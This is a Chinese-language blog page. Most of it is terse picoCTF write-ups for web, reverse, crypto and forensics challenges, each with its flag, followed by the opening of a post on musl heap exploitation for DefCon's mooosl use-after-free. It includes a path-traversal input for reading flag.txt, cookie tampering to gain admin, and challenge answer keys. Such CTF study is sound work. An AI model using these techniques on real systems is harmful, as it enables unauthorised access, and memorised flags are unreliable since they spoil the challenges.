<h2 id="1-includes"><a class="markdownIt-Anchor" href="#1-includes"></a> 1. Includes</h2>
<p>打开网页直接F12调出源码即可。</p>
<p>picoCTF{1nclu51v17y_1of2_f7w_2of2_df589022}</p>
<h2 id="2-inspect-html"><a class="markdownIt-Anchor" href="#2-inspect-html"></a> 2. Inspect HTML</h2>
<p>打开网页直接F12调出HTML即可。</p>
<p>picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}</p>
<h2 id="3-local-authority"><a class="markdownIt-Anchor" href="#3-local-authority"></a> 3. Local Authority</h2>
<p>先随便输然后提交，报错之后直接F12调出源代码即可获取用户名为admin，密码为strongPassword098765。</p>
<p>picoCTF{j5_15_7r4n5p4r3n7_05df90c8}</p>
<h2 id="5-forbidden-paths"><a class="markdownIt-Anchor" href="#5-forbidden-paths"></a> 5. Forbidden Paths</h2>
<p>输入…/…/…/…/flag.txt即可，会进行读取。</p>
<p>picoCTF{7h3_p47h_70_5ucc355_6db46514}</p>
<h2 id="6-power-cookie"><a class="markdownIt-Anchor" href="#6-power-cookie"></a> 6. Power Cookie</h2>
<p>用burpsuite抓包之后把请求里面的isAdmin由0改为1发过去即可。</p>
<p>picoCTF{gr4d3_A_c00k13_5d2505be}</p>
<h1 id="3-reverse-部分"><a class="markdownIt-Anchor" href="#3-reverse-部分"></a> 3. reverse 部分</h1>
<p>会pwn，能看汇编，reverse多少应该也会点吧。</p>
<h2 id="1-file-run1"><a class="markdownIt-Anchor" href="#1-file-run1"></a> 1. file-run1</h2>
<p>打开IDA直接出flag。</p>
<p>picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b}</p>
<h2 id="2-file-run2"><a class="markdownIt-Anchor" href="#2-file-run2"></a> 2. file-run2</h2>
<p>同上。</p>
<p>picoCTF{F1r57_4rgum3n7_be0714da}</p>
<h2 id="3-gdb-test-drive"><a class="markdownIt-Anchor" href="#3-gdb-test-drive"></a> 3. GDB Test Drive</h2>
<p>main函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;A:4@r%uL5b3F88bC05C`Gb0`hf4bfg2N&quot;</span>);</span><br><span class="line">  sleep(<span class="number">0x186A0</span>u);</span><br><span class="line">  s = (<span class="type">char</span> *)rotate_encrypt(<span class="number">0LL</span>, v5);</span><br><span class="line">  <span class="built_in">fputs</span>(s, _bss_start);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那个乱码应该是加密之前的字符串，经过rotate_encrypt出flag。</p>
<p>rotate_encrypt函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title function_">rotate_encrypt</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = strdup(a2);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[i] &gt; <span class="number">32</span> &amp;&amp; v5[i] != <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v5[i] + <span class="number">47</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &lt;= <span class="number">126</span> )</span><br><span class="line">        v5[i] = v3;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v5[i] -= <span class="number">47</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加密很简单，每个字节加47如果可打印就是这个，不可打印就在原来字节减47。在main函数里面有一个超长的等待，题目要我们用gdb可能是教我们怎么去跳过一个语句。按着题目的要求来就行了，也可以自己写脚本。</p>
<p>picoCTF{d3bugg3r_dr1v3_197c378a}</p>
<h2 id="4-patchmepy"><a class="markdownIt-Anchor" href="#4-patchmepy"></a> 4. <a target="_blank" rel="noopener" href="http://patchme.py">patchme.py</a></h2>
<p>打开patchme.py记下密码，然后运行输进去就行了。实际上加密也不难，可以自己写脚本或者直接给密码输入这个功能删掉直接解密。</p>
<p>ak98-=90adfjhgj321sleuth9000</p>
<h2 id="5-safe-opener"><a class="markdownIt-Anchor" href="#5-safe-opener"></a> 5. Safe Opener</h2>
<p>一个java源文件，发现是base64加密，直接拖到在线解密网站去解密。</p>
<p>picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}</p>
<h2 id="6-unpackmepy"><a class="markdownIt-Anchor" href="#6-unpackmepy"></a> 6. <a target="_blank" rel="noopener" href="http://unpackme.py">unpackme.py</a></h2>
<p>将执行的代码用对称加密算法fernet算法加密。直接在源码中加一句print即可输出解密结果出flag。</p>
<p>picoCTF{175_chr157m45_5274ff21}</p>
<p>做到这都有点怀疑我到底是不是在做逆向题。</p>
<h2 id="7-bloatpy"><a class="markdownIt-Anchor" href="#7-bloatpy"></a> 7. <a target="_blank" rel="noopener" href="http://bloat.py">bloat.py</a></h2>
<p>给所有函数名改了，所有字符串改成索引的形式，但是还是能很快定位密码是happychance。输入之后出flag。</p>
<p>picoCTF{d30bfu5c4710n_f7w_b8062eec}</p>
<h1 id="4-crypto-部分"><a class="markdownIt-Anchor" href="#4-crypto-部分"></a> 4. Crypto 部分</h1>
<h2 id="1-basic-mod1"><a class="markdownIt-Anchor" href="#1-basic-mod1"></a> 1. basic-mod1</h2>
<p>按照题目意思编写脚本即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">char_list = [<span class="number">54</span>,<span class="number">396</span>,<span class="number">131</span>,<span class="number">198</span>,<span class="number">225</span>,<span class="number">258</span>,<span class="number">87</span>,<span class="number">258</span>,<span class="number">128</span>,<span class="number">211</span>,<span class="number">57</span>,<span class="number">235</span>,<span class="number">114</span>,<span class="number">258</span>,<span class="number">144</span>,<span class="number">220</span>,<span class="number">39</span>,<span class="number">175</span>,<span class="number">330</span>,<span class="number">338</span>,<span class="number">297</span>,<span class="number">288</span>,]</span><br><span class="line">char_dict = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> char_list:</span><br><span class="line">    ref = char % <span class="number">37</span></span><br><span class="line">    flag += char_dict[ref]</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>picoCTF{R0UND_N_R0UND_79C18FB3}</p>
<h2 id="2-basic-mod2"><a class="markdownIt-Anchor" href="#2-basic-mod2"></a> 2. basic-mod2</h2>
<p>与上题类似，取逆元用sympy库的方法mod_inverse</p>
<p>picoCTF{1NV3R53LY_H4RD_C680BDC1}</p>
<h2 id="3-credstuff"><a class="markdownIt-Anchor" href="#3-credstuff"></a> 3. credstuff</h2>
<p>首先根据用户名找到密码：<br />
cvpbPGS{P7e1S_54I35_71Z3}<br />
这显然不是flag，首先猜测为凯撒密码。<br />
位移13求出flag。<br />
picoCTF{C7r1F_54V35_71M3}</p>
<h2 id="5-rail-fence"><a class="markdownIt-Anchor" href="#5-rail-fence"></a> 5. rail-fence</h2>
<p>W型的栅栏密码，5列</p>
<p>WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_4A76B997</p>
<h2 id="6-substitution0"><a class="markdownIt-Anchor" href="#6-substitution0"></a> 6. substitution0</h2>
<p>一段文字，应该是替换密码。一个一个词判断就行了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">EKSZJTCMXOQUDYLFABGPHNRVIW </span><br><span class="line"></span><br><span class="line">Mjbjhfly Ujcbeyz eblgj, rxpm e cbenj eyz gpepjui exb, eyz kblhcmp dj pmj kjjpuj</span><br><span class="line">         Legrand arose, with a gra?e and statel? air, and brought me the beetle</span><br><span class="line">tbld e cuegg segj xy rmxsm xp reg jysulgjz. Xp reg e kjehpxthu gsebekejhg, eyz, ep</span><br><span class="line">from a glass case in which it was enclosed. It was a beautiful scarabaeus, and, at</span><br><span class="line">pmep pxdj, hyqylry pl yephbeuxgpg—lt slhbgj e cbjep fbxwj xy e gsxjypxtxs flxyp</span><br><span class="line">                                                    prize</span><br><span class="line">lt nxjr. Pmjbj rjbj prl blhyz kuesq gflpg yjeb lyj jvpbjdxpi lt pmj kesq, eyz e</span><br><span class="line">of view. There were two ro?n? black ????? near one extremity of</span><br><span class="line">ulyc lyj yjeb pmj lpmjb. Pmj gseujg rjbj jvsjjzxycui mebz eyz culggi, rxpm euu pmj</span><br><span class="line"></span><br><span class="line">effjebeysj lt khbyxgmjz cluz. Pmj rjxcmp lt pmj xygjsp reg njbi bjdebqekuj, eyz,</span><br><span class="line"></span><br><span class="line">peqxyc euu pmxycg xypl slygxzjbepxly, X slhuz mebzui kuedj Ohfxpjb tlb mxg lfxyxly</span><br><span class="line">                                                           Jupiter</span><br><span class="line">bjgfjspxyc xp.</span><br><span class="line"></span><br><span class="line">Pmj tuec xg: fxslSPT&#123;5HK5717H710Y_3N0UH710Y_59533E2J&#125;</span><br><span class="line">             picoCTF&#123;5UB5717U710N_3V0LU710N_59533A2E&#125;</span><br><span class="line">a-q</span><br><span class="line">b-r</span><br><span class="line">c-g</span><br><span class="line">d-m</span><br><span class="line">e-a</span><br><span class="line">f-p</span><br><span class="line">g-s</span><br><span class="line">h-u</span><br><span class="line">i-y</span><br><span class="line">j-e</span><br><span class="line">k-b</span><br><span class="line">l-o</span><br><span class="line">m-h</span><br><span class="line">n-v</span><br><span class="line">o-j</span><br><span class="line">p-t</span><br><span class="line">q-k</span><br><span class="line">r-w</span><br><span class="line">s-c</span><br><span class="line">t-f</span><br><span class="line">u-l</span><br><span class="line">v-x</span><br><span class="line">w-z</span><br><span class="line">x-i</span><br><span class="line">y-n</span><br><span class="line">z-d</span><br></pre></td></tr></table></figure>
<p>picoCTF{5UB5717U710N_3V0LU710N_59533A2E}</p>
<h2 id="7-substitutuion1"><a class="markdownIt-Anchor" href="#7-substitutuion1"></a> 7. substitutuion1</h2>
<p>同上，找不到JQXZ对应的字母，但是通过flag可以知道Q对应什么字母。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IECj (jqfue cfu ixzelus eqs coxa) xus x emzs fc ifrzlesu jsiludem ifrzsededfy. Ifyesjexyej xus zusjsyesk hdeq x jse fc iqxoosyasj hqdiq esje eqsdu iusxedgdem, esiqydixo (xyk affaodya) jpdooj, xyk zuftosr-jfogdya xtdodem. Iqxoosyasj ljlxoom ifgsu x ylrtsu fc ixesafudsj, xyk hqsy jfogsk, sxiq mdsokj x jeudya (ixoosk x coxa) hqdiq dj jltrdeesk ef xy fyodys jifudya jsugdis. IECj xus x ausxe hxm ef osxuy x hdks xuuxm fc ifrzlesu jsiludem jpdooj dy x jxcs, osaxo sygdufyrsye, xyk xus qfjesk xyk zoxmsk tm rxym jsiludem auflzj xuflyk eqs hfuok cfu cly xyk zuxiedis. Cfu eqdj zuftosr, eqs coxa dj: zdifIEC&#123;CU3NL3YIM_4774IP5_4U3_I001_4871S6CT&#125;</span><br><span class="line">CTFs (short for capture the flag) are a type of computer security competition. contestants are presented with a set of challenges which test their creativity, ????????? (??? ????????) skills, ??? problem-solving ???????. ?????????? ??????? ????? ? ?????? ?? ??????????, ??? ???? ??????, ???? ?????? ? ?????? (?????? ? ????) ????? ?? ????????? ?? ?? ?????? ??????? ???????. ???? ??? ? ????? ??? ?? ????? ? ???? ????? ?? ???????? ???????? ?????? ?? ? ????, ????? ???????????, ??? ??? ?????? ??? ?????? ?? ???? ???????? ?????? ?????? ??? ????? ??? ??? ??? ????????. ??? ???? ???????, ??? ???? ??: picoCTF&#123;???????????????????????????????????&#125;</span><br><span class="line">a b c d e f g h i j k l m n o p q r s t u v w x y z</span><br><span class="line">g ? f i t o v w c s d u y q l k h m e b r ? ? a n p</span><br></pre></td></tr></table></figure>
<p>picoCTF{FR3QU3NCY_4774CK5_4R3_C001_4871E6FB}</p>
<h2 id="8-substitution2"><a class="markdownIt-Anchor" href="#8-substitution2"></a> 8. substitution2</h2>
<p>这次没有分隔符了。但是还是一样。这次用脚本替换。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gvjwjjoeugujajwqxzgvjwkjxxjugqfxeuvjivecvumvzzxmzbpsgjwujmswegrmzbpjgegezhuehmxsiehcmrfjwpqgwezgqhi</span><br><span class="line">sumrfjwmvqxxjhcjgvjujmzbpjgegezhunzmsupwebqwexrzhurugjbuqibeheugwqgezhnshiqbjhgqxukvemvqwjajwrsujns</span><br><span class="line">xqhibqwdjgqfxjudexxuvzkjajwkjfjxejajgvjpwzpjwpswpzujznqvecvumvzzxmzbpsgjwujmswegrmzbpjgegezheuhzgzh</span><br><span class="line">xrgzgjqmvaqxsqfxjudexxufsgqxuzgzcjgugsijhguehgjwjugjiehqhijomegjiqfzsgmzbpsgjwumejhmjijnjhueajmzbpj</span><br><span class="line">gegezhuqwjzngjhxqfzwezsuqnnqewuqhimzbjizkhgzwshhehcmvjmdxeuguqhijojmsgehcmzhnecumwepguznnjhujzhgvjz</span><br><span class="line">gvjwvqhieuvjqaexrnzmsujizhjopxzwqgezhqhiebpwzaeuqgezhqhizngjhvqujxjbjhguznpxqrkjfjxejajqmzbpjgegezh</span><br><span class="line">gzsmvehczhgvjznnjhueajjxjbjhguznmzbpsgjwujmswegreugvjwjnzwjqfjggjwajvemxjnzwgjmvjaqhcjxeubgzugsijhg</span><br><span class="line">uehqbjwemqhvecvumvzzxunswgvjwkjfjxejajgvqgqhshijwugqhiehcznznnjhueajgjmvhelsjueujuujhgeqxnzwbzshgeh</span><br><span class="line">cqhjnnjmgeajijnjhujqhigvqggvjgzzxuqhimzhnecswqgezhnzmsujhmzshgjwjiehijnjhueajmzbpjgegezhuizjuhzgxjq</span><br><span class="line">iugsijhgugzdhzkgvjewjhjbrqujnnjmgeajxrqugjqmvehcgvjbgzqmgeajxrgvehdxedjqhqggqmdjwpemzmgneuqhznnjhue</span><br><span class="line">ajxrzwejhgjivecvumvzzxmzbpsgjwujmswegrmzbpjgegezhgvqgujjdugzcjhjwqgjehgjwjugehmzbpsgjwumejhmjqbzhcv</span><br><span class="line">ecvumvzzxjwugjqmvehcgvjbjhzscvqfzsgmzbpsgjwujmswegrgzpelsjgvjewmswezuegrbzgeaqgehcgvjbgzjopxzwjzhgv</span><br><span class="line">jewzkhqhijhqfxehcgvjbgzfjggjwijnjhigvjewbqmvehjugvjnxqceupemzMGN&#123;H6W4B_4H41R515_15_73I10S5_8J1FN808&#125;</span><br><span class="line"></span><br><span class="line">thereexistseveralotherwellestablishedhighschoolcomputersecuritycompetitionsincludingcyberpatriotand</span><br><span class="line">uscyberchallengethesecompetitionsfocusprimarilyonsystemsadministrationfundamentalswhichareveryusefu</span><br><span class="line">landmarketableskillshoweverwebelievetheproperpurposeofahighschoolcomputersecuritycompetitionisnoton</span><br><span class="line">lytoteachvaluableskillsbutalsotogetstudentsinterestedinandexcitedaboutcomputersciencedefensivecompe</span><br><span class="line">titionsareoftenlaboriousaffairsandcomedowntorunningchecklistsandexecutingconfigscriptsoffenseontheo</span><br><span class="line">therhandisheavilyfocusedonexplorationandimprovisationandoftenhaselementsofplaywebelieveacompetition</span><br><span class="line">touchingontheoffensiveelementsofcomputersecurityisthereforeabettervehiclefortechevangelismtostudent</span><br><span class="line">sinamericanhighschoolsfurtherwebelievethatanunderstandingofoffensivetechniquesisessentialformountin</span><br><span class="line">ganeffectivedefenseandthatthetoolsandconfigurationfocusencounteredindefensivecompetitionsdoesnotlea</span><br><span class="line">dstudentstoknowtheirenemyaseffectivelyasteachingthemtoactivelythinklikeanattackerpicoctfisanoffensi</span><br><span class="line">velyorientedhighschoolcomputersecuritycompetitionthatseekstogenerateinterestincomputerscienceamongh</span><br><span class="line">ighschoolersteachingthemenoughaboutcomputersecuritytopiquetheircuriositymotivatingthemtoexploreonth</span><br><span class="line">eirownandenablingthemtobetterdefendtheirmachinestheflagispico???????????????????????????????????????</span><br></pre></td></tr></table></figure>
<p>picoCTF{N6R4M_4N41Y515_15_73D10U5_8E1BF808}</p>
<h2 id="9-transposition-trial"><a class="markdownIt-Anchor" href="#9-transposition-trial"></a> 9. transposition-trial</h2>
<p>移位密码，3字节一组。</p>
<p>picoCTF{7R4N5P051N6_15_3XP3N51V3_56E6924A}</p>
<h2 id="10-vigenere"><a class="markdownIt-Anchor" href="#10-vigenere"></a> 10. Vigenere</h2>
<p>维吉尼亚密码。key = CYLAB</p>
<p>picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q}</p>
<h1 id="5-forensics-部分"><a class="markdownIt-Anchor" href="#5-forensics-部分"></a> 5. Forensics 部分</h1>
<p>这个部分应该是杂项。</p>
<h2 id="1-enhance"><a class="markdownIt-Anchor" href="#1-enhance"></a> 1. Enhance!</h2>
<p>浏览器打开svg然后F12调源码。</p>
<p>picoCTF{3nh4nc3d_aab729dd}</p>
<h2 id="3-lookey-here"><a class="markdownIt-Anchor" href="#3-lookey-here"></a> 3. Lookey here</h2>
<p>字符串查找完事。</p>
<p>picoCTF{gr3p_15_@w3s0m3_4c479940}</p>
<h2 id="4-packets-primer"><a class="markdownIt-Anchor" href="#4-packets-primer"></a> 4. Packets primer</h2>
<p>Wireshark。</p>
<p>picoCTF{p4ck37_5h4rk_ceccaa7f}</p>
<h2 id="5-redaction-gone-wrong"><a class="markdownIt-Anchor" href="#5-redaction-gone-wrong"></a> 5. Redaction gone wrong</h2>
<p>选中复制就行了。</p>
<p>picoCTF{C4n_Y0u_S33_m3_fully}</p>
<h2 id="6-sleuthkit-intro"><a class="markdownIt-Anchor" href="#6-sleuthkit-intro"></a> 6. Sleuthkit Intro</h2>
<p>mmls获取信息之后nc填进去就行了</p>
<p>picoCTF{mm15_f7w!}</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-4/" class="post-title-link" itemprop="url">musl pwn 入门 (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:42:38" itemprop="dateCreated datePublished" datetime="2023-02-28T22:42:38+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在前面的介绍中，我们学习了musl pwn的基本原理，下面我们就通过一道经典例题进一步巩固。</p>
<p>这是DefCon Quals 2021中的一道题mooosl，直接在github上搜这道题的名字就可以找到作者发布的附件，内含说明、作者的exp、源码以及二进制程序。</p>
<p>注：我本来以为题目给的musl 1.2.2的libc和自己机子上面的一样，结果发现差得太远了，白花了我大半天时间。😭</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241104#h2-3">参考文章</a></p>
<h1 id="1-逆向分析"><a class="markdownIt-Anchor" href="#1-逆向分析"></a> 1. 逆向分析</h1>
<p>这是一个菜单题，包含三种操作store、query和delete，经过逆向分析之后可以知道这个菜单题的数据结构逻辑。<strong>程序中有一段0x8000大小的空间hashmap，可以保存0x1000个指针。这个指针是作者定义的结构体，结构体中包含有两个字符串，分别为key和value。进行store操作时，首先输入key，然后程序使用一个函数计算其哈希值（0-0xFFF），这个哈希值就是这个结构体需要保存到hashmap中的索引。如果有两个key的哈希值相同，则第二次store获取的结构体就会成为hashmap中的链首，结构体中还有一个指针用于形成链表，第一次store的结构体的地址就保存在第二次store的结构体之中。query则是根据输入的key值计算出哈希值对应的结构体并输出。delete会将找到的结构体移出hashmap。</strong></p>
<p>本题的漏洞在delete函数中：</p>
<p><img src="https://img-blog.csdnimg.cn/cbb4c310bd414edcb3f3ea06674157fc.png" alt="结构体的声明" /></p>
<p><img src="1.png" alt="" /></p>
<p>注意delete中的if语句，这个if语句内部的功能是从hashmap中移出结构体实例，p_chain就是hashmap中的地址。但这里有一种情况没有考虑：当要删除的结构体位于链尾时，if语句的两个条件都不会满足，这样这个结构体就不会从链表中删除，而是留在其中。这就为我们UAF创造了条件。如果我们能够通过堆排布操作让另一个结构体的value地址等于这个已经被删除的结构体地址，那么通过query我们就能够获取到这个结构体中的内容，其中包含多个指针的地址。</p>
<h1 id="2-解题第一步泄露信息"><a class="markdownIt-Anchor" href="#2-解题第一步泄露信息"></a> 2. 解题第一步——泄露信息</h1>
<p>我们再来回顾一下<code>free</code>函数的流程：<code>free</code>的重点在于<code>nontrivial_free</code>，注意下面的代码片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (free函数的一个片段)</span></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">		<span class="type">int</span> e = errno;</span><br><span class="line">		munmap(mi.base, mi.len);</span><br><span class="line">		errno = e;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (nontrivial_free函数的一个片段)</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (free_group中的一个片段)</span></span><br><span class="line">	<span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">		step_seq();</span><br><span class="line">		record_seq(sc);</span><br><span class="line">		mi.base = g-&gt;mem;</span><br><span class="line">		mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	